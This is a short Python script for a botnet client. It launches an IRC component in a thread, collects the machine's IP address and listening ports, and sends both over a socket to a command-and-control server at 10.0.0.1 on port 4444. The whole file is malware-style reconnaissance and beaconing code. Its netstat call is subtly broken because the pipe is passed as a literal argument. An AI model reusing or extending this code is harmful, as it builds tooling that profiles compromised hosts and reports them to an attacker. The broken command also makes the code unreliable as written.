import socket
import subprocess
from irc_server import set_up_irc
from threading import Thread
import time

def get_my_ip():
    cmd = ['hostname', '-I']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    my_ip = o.decode('ascii')
    return my_ip[:-1]

def get_my_open_ports():
    cmd = ['netstat', '-tulpn', '|', 'grep', 'LISTEN']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    open_ports = o.decode('ascii')
    return open_ports[:-1]

def send_info_to_server(client_socket, my_ip, my_open_ports):
    # print("Sending ", my_ip)
    client_socket.send(f"my_ip: {my_ip}".encode())
    data = client_socket.recv(1024).decode()
    if data != "ACK":
        print("Server hasn't received my_ip correctly")

    # print("Sending ", my_open_ports)
    client_socket.send(f"my_open_ports: {my_open_ports}".encode())
    data = client_socket.recv(1024).decode()
    if data != "ACK":
        print("Server hasn't received my_open_ports correctly")

    return 1

def client_program():
    # create a thread
    thread = Thread(target=set_up_irc)
    # run the thread
    thread.start()

    # time.sleep(5)
    # server info
    host = "10.0.0.1"
    port = 4444

    # get my info
    my_ip = get_my_ip()
    my_open_ports = get_my_open_ports()

    print("bot is connecting to C&C for sending info")
    # connect to server
    client_socket = socket.socket()
    client_socket.connect((host, port))

    # send my info to server
    send_info_to_server(client_socket, my_ip, my_open_ports)

    client_socket.close()  # close the connection


if __name__ == '__main__':
    client_program()